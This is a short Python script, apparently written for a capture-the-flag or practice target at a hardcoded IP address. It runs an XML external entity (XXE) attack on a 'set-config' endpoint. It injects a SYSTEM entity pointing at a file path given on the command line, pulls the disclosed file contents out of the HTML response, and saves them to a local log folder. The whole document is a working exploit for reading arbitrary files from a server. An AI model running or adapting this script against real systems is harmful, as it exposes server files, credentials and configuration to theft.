import requests, sys
import urllib.parse

payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{}">]><config><location>&xxe;</location></config>'
url = "http://34.74.105.127/ad11c38870/set-config?data="

if sys.argv[1] != None:
    encoded_payload = urllib.parse.quote(payload.format(sys.argv[1]))
    try:
        txt = requests.get(url + encoded_payload).text.replace('value="', "$$").replace('" disabled', "$$").split('$$')[1]
        print(txt)
        f = open('./log/'+sys.argv[1].split('/')[-1], 'w+')
        f.write(txt)
        f.close()
    except Exception as e:
        print(e)